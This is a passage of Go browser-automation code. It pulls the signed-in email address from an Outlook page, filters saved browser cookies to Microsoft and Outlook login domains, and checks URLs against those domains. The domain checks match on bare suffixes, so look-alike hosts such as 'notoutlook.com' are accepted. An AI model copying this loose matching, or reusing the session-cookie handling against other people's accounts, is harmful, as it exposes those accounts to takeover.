		text = strings.TrimSpace(text)
		if strings.Contains(text, "@") {
			return text
		}
	}

	result, err := page.Eval(`() => {
		try {
			const meBtn = document.querySelector('[data-testid="mectrl_currentAccount_secondary"]');
			if (meBtn) return meBtn.textContent.trim();
			const allBtns = document.querySelectorAll('button[aria-label]');
			for (const btn of allBtns) {
				const label = btn.getAttribute('aria-label');
				if (label && label.includes('@')) {
					const match = label.match(/[\w.-]+@[\w.-]+/);
					if (match) return match[0];
				}
			}
		} catch(e) {}
		return '';
	}`)
	if err == nil && result != nil {
		val := result.Value.String()
		if val != "" && strings.Contains(val, "@") {
			return val
		}
	}

	return ""
}

// jsonEscape escapes a string for use in JavaScript
func jsonEscape(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}

// ParseCookiesForDomains returns cookies filtered by Microsoft/Outlook domains
func ParseCookiesForDomains(cookiesJSON string) ([]cookieEntry, error) {
	var cookies []cookieEntry
	if err := json.Unmarshal([]byte(cookiesJSON), &cookies); err != nil {
		return nil, err
	}

	msftDomains := []string{
		"live.com", "microsoft.com", "microsoftonline.com",
		"office.com", "office365.com", "outlook.com",
		"login.live.com", "outlook.live.com",
	}

	var filtered []cookieEntry
	for _, c := range cookies {
		domain := strings.TrimPrefix(c.Domain, ".")
		for _, d := range msftDomains {
			if strings.HasSuffix(domain, d) {
				filtered = append(filtered, c)
				break
			}
		}
	}

	return filtered, nil
}

// IsOutlookDomain checks if a URL belongs to an Outlook/Microsoft domain
func IsOutlookDomain(rawURL string) bool {
	u, err := url.Parse(rawURL)
	if err != nil {
		return false
	}
	host := strings.ToLower(u.Hostname())
	domains := []string{
		"live.com", "microsoft.com", "microsoftonline.com",
		"office.com", "office365.com", "outlook.com",
	}
	for _, d := range domains {
		if strings.HasSuffix(host, d) {
			return true
		}
	}
	return false
}
